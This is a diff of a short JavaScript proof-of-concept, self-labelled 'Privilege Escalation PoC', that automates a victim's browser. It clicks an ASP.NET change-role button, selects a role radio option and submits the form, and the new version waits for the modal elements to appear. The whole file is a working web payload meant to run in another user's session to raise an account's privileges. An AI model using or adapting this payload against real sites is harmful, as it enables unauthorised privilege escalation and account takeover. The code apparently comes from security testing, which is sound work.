@@ -1,28 +1,44 @@
 alert("Privilege Escalation PoC , change user account role");
-// 1. Click a specific button by ID
-const button = document.getElementById('ContentPlaceHolder1_btnChangeRole');
-if (button) {
-  button.click();
-} else {
-  console.error('Button not found: your-button-id');
+// Helper: wait for an element to appear in the DOM
+function waitForElement(selector, timeout = 5000, interval = 100) {
+  return new Promise((resolve, reject) => {
+    const startTime = Date.now();
+
+    const check = () => {
+      const el = document.querySelector(selector);
+      if (el) {
+        resolve(el);
+      } else if (Date.now() - startTime >= timeout) {
+        reject(new Error(`Element not found within ${timeout}ms: ${selector}`));
+      } else {
+        setTimeout(check, interval);
+      }
+    };
+
+    check();
+  });
 }
 
-// 2. Find a specific radio input and set its value/checked state
-const radio = document.getElementById('ContentPlaceHolder1_rblRoles_2');
-if (radio) {
-  radio.checked = true; // marks this radio as selected
-  // If you need to trigger any listeners bound to change events:
-  radio.dispatchEvent(new Event('change', { bubbles: true }));
-} else {
-  console.error('Radio input not found: your-radio-id');
+async function runFlow() {
+  try {
+    // 1. Click the first button (opens the modal)
+    const button = document.getElementById('ContentPlaceHolder1_btnChangeRole');
+    if (!button) throw new Error('First button not found');
+    button.click();
+
+    // 2. Wait for the radio button to appear inside the modal, then check it
+    const radio = await waitForElement('#ContentPlaceHolder1_rblRoles_2');
+    radio.checked = true;
+    radio.dispatchEvent(new Event('change', { bubbles: true }));
+
+    // 3. Wait for the submit button to appear, then click it
+    const submitBtn = await waitForElement('#ContentPlaceHolder1_btnSaveRole');
+    submitBtn.click();
+
+    console.log('Flow completed successfully.');
+  } catch (err) {
+    console.error(err.message);
+  }
 }
 
-// 3. Find the submit input and submit the form
-const submitBtn = document.getElementById('ContentPlaceHolder1_btnSaveRole');
-if (submitBtn) {
-  submitBtn.click();
-  // Alternative if it's an <input type="submit"> inside a form:
-  // submitBtn.form.submit();
-} else {
-  console.error('Submit input not found: your-submit-id');
-}
+runFlow();
